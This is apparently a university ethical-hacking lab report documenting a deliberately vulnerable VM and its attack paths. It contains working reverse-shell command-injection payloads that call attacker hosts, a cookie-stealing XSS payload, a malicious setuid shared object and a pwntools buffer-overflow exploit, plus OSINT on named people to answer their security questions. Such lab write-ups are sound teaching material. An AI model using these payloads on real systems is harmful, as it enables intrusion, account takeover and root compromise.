<center>
<h1>
Ethical Hacking Lab Assignment
</h1>
 
Virtual machine design and report<br/>
<b>
Group <code>0xe</code> - Owanesh, zBION1C, Frayu1600
</b><br/>
*vC0rp* Virtual Machine
</center>

---

This is a report for the Ethical Hacking course directed by Daniele Friolo and Davide Guerri for the Academic Year 23/24 at Sapienza University of Rome.

We were instructed to design a virtual machine (VM) containing deliberate vulnerabilities and to create a written report documenting the machine itself and three different paths to obtain remote access and finally escalate privileges to root user.

<h1>Table of contents</h1>

- [Machine specifications](#machine-specifications)
  - [Context](#context)
  - [Machine overview](#machine-overview)
- [Obtaining remote access](#obtaining-remote-access)
  - [🟢 Easy path](#-easy-path)
  - [🟠 Medium path](#-medium-path)
  - [🔴 Hard path](#-hard-path)
- [Privilege escalation](#privilege-escalation)
  - [🟢 Easy path](#-easy-path-1)
  - [🟠 Medium path](#-medium-path-1)
  - [🔴 Hard path](#-hard-path-1)
- [How it's made - Machine](#how-its-made---machine)

# Machine specifications
## Context
`vC0rp` presents itself as a company that cares about veganism and the environment. They run a popular blog called "The Green Crusaders" which talks about being vegan and saving the planet.

But here's the twist: secretly, `vC0rp` is involved in something shady. Behind the scenes, they're actually a big part of the illegal meat trade. While they preach about being kind to animals and the environment, they're making money from selling meat on the black market!

In their offices, top bosses are always coming up with sneaky plans to keep their illegal business going. They bend the rules and bribe people to stay under the radar. It's a two-faced operation – they say one thing in public but do the opposite in private.

As their secret starts to leak out, `vC0rp` finds itself in big trouble. Will they be exposed for their lies, or will they keep getting away with their deceitful actions?

## Machine overview
The machine runs an `nginx` web server that hosts The Green Crusaders blog. This blog presents vulnerabilities such as cross site scripting, command injection and other poor security policies that can be exploited by an attacker to gain remote access. 

There are three users registered on the blog, being:
- **Fabiola Di Sotto** aka `vegmamy`, blog author
- **Giorgio Immesi** aka `ilveganoimbruttito`, blog author
- **Matteo Ricci**, a member of the staff, is currently organizing a protest.
  
The machine also runs an `ftp` server which contains an interesting sql backup. 

Behind the scenes, the server runs another web server hosting an *hidden* web service for the trade of meat. This web service is placed inside docker for security reasons and is **not an easy target**. 

There are also some command line interface programs in the server's file system used internally by the staff to trade meat. These programs present some vulnerabilities that can be leveraged to gain privileged access.

Below is shown a diagram of the machine with all the services running and a brief description on how to attack them:

![Machine diagram](images/diagram.png)

# Obtaining remote access
First things first, when a penetration tester has a machine, they should do scanning, therefore we run a quick and easy `nmap` towards the machine itself
```sh
$ nmap -sS -O <machine_ip>
```
Which would output the following
```sh
Starting Nmap 7.93 ( https://nmap.org ) at 2024-04-29 12:38 CEST
Nmap scan report for <machine_ip>
Host is up (0.00019s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:C0:9D:59 (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5.4
OS details: Linux 5.4
Network Distance: 1 hop

OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.12 seconds
```
Now we have every single ingredient for our remote access adventure, of which we were instructed to provide three different paths.

## 🟢 Easy path
From the scanning, we can notice that there is an ftp server (port 21) running. We should also notice by probing the authentication mechanism of the ftp server that it allows anonymous authentication
```sh
ftp <machine_ip>
```
The landing directory will contain two files called `leavemehere.txt`, which contains some information for the login page, and the `sql_backup.zip` that contains the user table backup of the vegan blog. 


We have to download the backup 
```sh
get sql_backup.zip 
```
The `sql_backup.zip` has a password required to extract informations. To obtain this password we can use `johntheripper` swiss-knife with the module `zip2john`

After that, with a common wordlist (rockyou is enough) we can read the clear-text credentials from it.

```sh
zip2john sql_backup.zip > zip.hash

john --wordlist=/rockyou.txt zip.hash
```

In this backup there is only one user currently active in the blog and is Matteo Ricci.

![](images/tgc/login.png)

We can now login as Matteo Ricci, a not so expert staff member of `vC0rp`. He is currently organizing a protest and published the private key of the server! 

![](images/tgc/matteo_profile.png)

```sh
chmod 600 ./downloaded_id_rsa
```
```sh
ssh matteo@your.vm.vcorp.ip -i ./downloaded_id_rsa
```
This private key can be used to login with ssh on the machine.

## 🟠 Medium path 

As previously said, `vC0rp` runs a popular blog, "The Green Crusaders",

![Green crusaders homepage](images/tgc/home.png)

Articles can be accessed at `/blog` on port `:80` 

![The Green Crusaders Blog](images/tgc/blog.png)

The blog will contain articles centered around veganism and such. We can see that there are two main authors:
1. Fabiola di Sotto
2. Giorgio Immesi
   
Let’s gather some juicy information by enumerate usernames by checking any blog post, for instance:
```sh
/blog/compassionate-future-rethinking-relationship-food-nature
```
Which will look like so:

![A page from The Green Crusaders Blog](images/tgc/article.png)

Let’s click onto the name of the author itself, in this case Giorgio Immesi, which will lead to the following page:
```sh
/blog/author/ilveganoimbruttito
```
![Green Crusader Author page](images/tgc/medium/author_page.png)
So far, we’ve understood that his username is `ilveganoimbruttito` he is a post author. Now we could try to ask for a password reset, using above username, which will succeed in Step 1.

Then, as Step 2, we will get asked 3 security questions… which we will have to answer all (for example):
1. `Which year have you become vegan?`
2. `Which day were you born?`
3. `In which town have you attended elementary school?`

Well, we can try googling Giorgio Immesi, and from a very quick search we can notice that he is a famous Italian vegan blogger and activist... who owns
- An instagram account
- A YouTube account
- A TikTok account
  
Famous people usually tend to leave *too much* information about their life online… will this be their demise in this case?

Indeed, because we can answer all three questions with a little bit of **OSINT** work: 
1. [‘PERCHE' SONO VEGANO : Tutta la VERITA' - Video di Giorgio Immesi’](https://www.youtube.com/watch?v=EXITzZ9L5xI&t=440s) 
   -  Answer: `2015`
2. [‘TUTTA la MIA VITA in 8 MINUTI - Vlog di Giorgio Immesi’](https://www.youtube.com/watch?v=IuCCZJRuq2M&t=45s)
   - Answer: `10th December`
3. [‘TUTTA la MIA VITA in 8 MINUTI - Vlog di Giorgio Immesi’](https://www.youtube.com/watch?v=IuCCZJRuq2M&t=159s)
   - Answer: `Santilario`

By inputting the above answers, we will get output the hash of the password, which is the following string
```sh
78b831bcd471476ccc79bb5d1b3762ba95980454985d074841fcef2dd127cc46
```
Which is sent to the following email address:
```sh
ilveganoimbruttito@greencrusaders.0xe
```
Now we check which kind of algorithm output the above hash, which can be done with any online or offline tool, in this case we can use `hash-identifier` in the following way:
```sh
hash-identifier 78b831bcd471476ccc79bb5d1b3762ba95980454985d074841fcef2dd127cc46
```
We will get told that the most probable candidate is SHA256, which is pretty secure… right?
![Hash identifier](images/tgc/medium/kali_hash_identifier.png)

You never know until you try it, we can try to crack it by using any password cracking tool like **JohnTheRipper** or **hashcat**, in this case we will use the Ripper, while using the `rockyou` wordlist and specifying that it is a SHA256 digest:
```sh
echo "78b831bcd471476ccc79bb5d1b3762ba95980454985d074841fcef2dd127cc46" > tgc_user_pass.txt
john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-sha256 tgc_user_pass.txt 
```
Bingo!

![Successful password crack](images/tgc/medium/kali_hash_decode.png)

We can now try logging in using the just cracked password and the above login:
```
username: ilveganoimbruttito@greencrusaders.0xe
password: 4everlove
```
And we’re in as blog author!

**Note**: the same could be done with blog author "Fabiola di Sotto", whose username is `vegmamy`. In her case, everything is available on her Instagram account.

For completion we add source of information and q&a.
```json
{
  "question": "What month was your first child born?",
  "correctAnswer": "March",
  "source": "https://www.facebook.com/fabiolavegmamy/photos/pb.100063526240710.-2207520000/207439207837009/?type=3"
},
{
  "question": "What month did you get married?",
  "correctAnswer": "September",
  "source": ["https://www.facebook.com/photo/?fbid=794693622658172&set=pb.100063526240710.-2207520000", "https://www.instagram.com/p/CiCO8jCvK1_/"]
},
{
  "question": "What month has your brother gotten married?",
  "correctAnswer": "December",
  "source": "https://www.instagram.com/p/CXbXTKugxQJ/"
}

```
Once entered as author of the blog, from the bottom of the profile page of the user we can access the `/YWRtaW4K/dashboard` which displays info on the posts of the user. 


![Author’s dashboard](images/tgc/medium/user_dashboard.png)

From the site’s dashboard on the right, the author can search for the active users of the blog, which seems legit… or is it?

Not at all: the search form is vulnerable to `command injection`, which we can easily check by writing
```sh
"; ls #
```
There seems not to be any kind of filtering applied to it, after all, we are trusted authors! 

![User search command injection](images/tgc/medium/user_dashboard_command_injection.png)

Therefore, we get a reverse shell from it by injecting the following bash command
```sh
"; python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("your.attacker.machine.ip",attacker_port));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")' # 
```
## 🔴 Hard path
To exploit the hard path we have to take the same steps of the medium path, so we have to be logged in as an author of the blog (any). As an author of the blog, we can publish posts from the `/YWRtaW4K/new-article` page

![Publishing new posts](images/tgc/medium/new_article.png)

However, we don’t have complete control over what we post, as upon pressing ‘post article’, our post will have to be checked by an administrator for approval… boring!

![Publishing new posts](images/tgc/medium/article_processing.png)
After a **painful** wait, we will have our post published. Hooray…? Indeed, because when it comes to posts and possible vulnerabilities, the first one that will come into our mind is cross site scripting.

![New post is submitted](images/tgc/medium/article_submitted.png)

The post submission process does not check and validate user input automatically so cross site scripting is possible which we can double check that by posting a post with the following input

```html
<img src=”x” onload=”alert(1)” />
```
Therefore, we can try getting the admin cookie by inputting
```html
<img src=”x” onerror=fetch('http://127.0.0.1:8000?'+document.cookie) />
```
and catching the response with a simple trusty Python server through command line
```sh
python3 -m http.server
```
Let's wait for the “admin” to check our post. When he opens our post he will trigger the `cross site scripting` payload. We will then obtain the following result in our python server:
```sh
::ffff:127.0.0.1 - - [23/Apr/2024 19:19:05] "GET /?userData=fc7fcd0dfff43f12ea176c886e9a6e98d2dc4645bc09f009bfcc78390947eb6c641dace3d9a2c6d9539b75ff2a9cb809f8a493e88a9a45b62ac52179a6b323c789c8fde69a7bea3c4ede6aeb71fa183f3ff0e5ef78d45f68c2b1dfcd2d0e7602f23c7990c61a5d1e6ac7da58383a1292d025411d159f89e28e64845f1c4bc64d5d9a0ee6dc44e267d0ae1e87d751506e8489c8ae420563bcf451fb52ebc99805 HTTP/1.1" 200 -
::ffff:127.0.0.1 - - [23/Apr/2024 19:19:35] "GET /?userData=71c2e52a10d556e4a059a0dbfb8052db01e6c6dbff383879211163d6a748da4dddcb4a39ceb761cd05402fefa6d71ec5fc2ad619da1097599b946b172b023854288cb087e15e2ecd1c8ec41e0437a4c037e4edb3e1085ba9c97efc35c4c09afc4ae64fd0fbd3a93f0435871fce25cc1ef3a1db3ec484eaafed077fe59e3d268e470d8bd38f495f73cc5db152701e2242a94bd8e55e08535ec1654510f00f5644b8717c9c811f0f280604d1b15f9dd4b4 HTTP/1.1" 200 -
```
![](images/tgc/medium/dump_admin_cookie_2.png)

Now that we have the admin cookie in our hands, we can now login as the admin!

After we logged in as the admin we can access the admin panel. 
![organize a protest](images/tgc/hard/admin_landing.png)

From here we can organize a vegan protest. The form to submit a protest asks for an image of the protest. 

![organize a protest](images/tgc/hard/admin_protest.png)
If we submit a valid (or invalid) flyer for the protest, we will obtain a badge that notify for a legit or non legit image.

![organize a protest](images/tgc/hard/admin_image_upload.png)

The file uploaded is checked for it to be an image. This check is done by an API that checks the filename of the image using a bash script. 

![organize a protest](images/tgc/hard/admin_api_analyze.png)

If we interrogate this API with the OPTIONS method of HTTP we discover the methods accepted by the API:

![burp options response](images/tgc/hard/admin_api_analysis.png)

This API is under development and the developers are experimenting with some HTTP methods. Indeed if we send the image to the API with a POST 
request the check is done correctly and the filename is sanitized. 

However the developers are currently implementing a new and more robust check and they are testing it using the PUT method, so that the current POST method check remains usable.

![PUT API check](images/tgc/hard/admin_api_analysis_2.png)

If we submit the file to the API but with a PUT request the API will not sanitize the filename and this will lead to remote command execution!
If we inject the following payload
```sh
{"filename":"\"; python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"your.attacker.machine.ip\",attacker_port));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"bash\")' #"}

```
![Burpsuite filename payload](images/tgc/hard/admin_api_exploit.png)
 
# Privilege escalation
Once remote access has been obtained, the penetration tester can look to escalate privileges in order to completely exploit the machine and gather all kinds of information they were not supposed to.

As instructed, there are three different ways to achieve privilege escalation:

## 🟢 Easy path
In the home directory of the *saltbae* user there is a C executable called `shadow-butchers-client` that is used by the people hosting the website to connect to a *super secret black market* for buying meat! This executable has the SETUID bit set and is owned by the root user. It also presents the following features:
- List affiliated suppliers
- Order meat from suppliers
- Check meat in stock
- Sell meat (premium edition only)

The option to sell meat on the black market using this client is reserved only to those people who bought the premium edition. *Saltbae* already purchased the premium, indeed there is the `shadow-butchers-premium.so` file in the home directory, which is a shared object used by the main program to load the sell feature.

There is no check on the integrity of the `shadow-butchers-premium.so` so the attack consists of creating another file named `shadow-butchers-premium.so` and inserting the following content:

```c
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
static void inject()
__attribute__((constructor));
void inject() {
  setuid(0);
  system("/bin/sh");
}
// Optional
int sell() {
  printf("You are not selling anything today sir!");
}
```
Once the above file is compiled with
```sh
gcc --shared -m32 -fPIC -o shadow-butchers-premium.so shadow-butchers-premium.c
```
The attacker has to execute the `shadow-butchers-client` and has to select the *sell* option. Since this option was overwritten it will spawn a root shell.

## 🟠 Medium path
Once we have remote access to the machine, we could start to enumerate it. The enumeration process led us to a hidden web service running on a docker container listening on localhost. 

First thing to do to visit the website is a Local Port Forwarding as follows
```sh
ssh -L 9090:localhost:3100 [matteo|saltbae]@vuln_machine_ip -i /downloaded_id_rsa
```
In this way we open a port 9090 on our attacker machine.
This step is necessary because port 3100 is blocked by outside 
```sh
curl vulnerable_machine_ip:3100
>> curl: (7) Failed to connect to vulnerable_machine_ip port 3100 after 2 ms: Couldn't connect to server
```
![Shadow Butcher Homepage](images/shadow/home.png)

We start to play with the website until we find the `/resellers` page. This page presents a search bar used to find meat resellers in the world.
![](images/tgc/hard/reseller_rce.png)
 This search bar presents yet another command injection vulnerability. With the following payload we spawn a reverse shell:
```sh
“; nc 192.168.1.142 9321 -e /bin/ash %23
```
Once we enter we can notice that we are running into a different Linux version than normal. And analyzing running processes something is familiar for who has already used docker.

We realize that we are not in the system, but in a container, a privileged container! 


> this is possible because docker is runned with the following command
> `docker run -d --pid=host -v /:/host/ --privileged -p 3100:3100 --restart unless-stopped nextjs-docker`
> allowing also `capsh --print` attack
> 
We can mount the server's filesystem on the docker container and act as the root of the server:
```sh
chroot /host sh
```
![](images/shadow/shell_escape.png)

## 🔴 Hard path
The same `shadow-butchers-client` executable in the *saltbae* home is vulnerable to a buffer overflow. The buffer overflow is exploitable from the *order meat from suppliers* option. The program will ask the user to input the name of the supplier he wants to buy the meat from. This string is copied to a buffer without checking the length. Since the machine does not have ASLR active and the executable was compiled with executable stack and with no canaries the exploitation is pretty straight forward.

We tested the following python exploit written using the *pwntools* library:
```py
from pwn import *
context.update(arch='i386', os='linux')

io = process('./shadow-butchers-client')

shellcode = b'\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80'
padding = b'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJ'
slide = b'\x90'*32
payload = padding + b'\x2c\xd5\xff\xff' + slide + shellcode

raw_input("Attach GDB")

io.recvuntil(b'Options')
print(io.recvline())
print(io.recvline())
print(io.recvline())
print(io.recvline())
print(io.recvline())

io.sendline(b'2')
io.sendline(payload)

io.interactive()
```
This indeed spawns a root shell.

# How it's made - Machine

The recipe for this system comprises several key ingredients:

1. **Ansible**: Employed for scripting and orchestrating the setup and management of services. Ansible facilitates the seamless configuration and deployment of infrastructure components.

2. **Docker**: Utilized for containerization, enabling the encapsulation of services into lightweight, portable containers. Docker enhances scalability, efficiency, and consistency in deploying and running applications across different environments.

3. **NextJS**: The backbone of various services, implemented as custom NextJS (v14) projects. NextJS, with its robust capabilities for building server-side rendered and static websites, powers the core functionality of the system's web applications. (Typescript and TailwindCSS used)

4. **C (and Binary Exploitation Knowledge)**: Applied for crafting custom binaries that can be executed by users. Proficiency in C, coupled with expertise in binary exploitation techniques, ensures the development of tailored executables that uphold user accessibility and system security.

Custom NextJS projects are deployed, with one served via Nginx as a reverse proxy and another encapsulated within Docker containers. Ansible streamlines the entire process, from provisioning infrastructure to managing service deployment, ensuring efficiency and consistency throughout the system's lifecycle.


Entire source code is available on [GitHub](https://github.com/Owanesh/ETH2324)

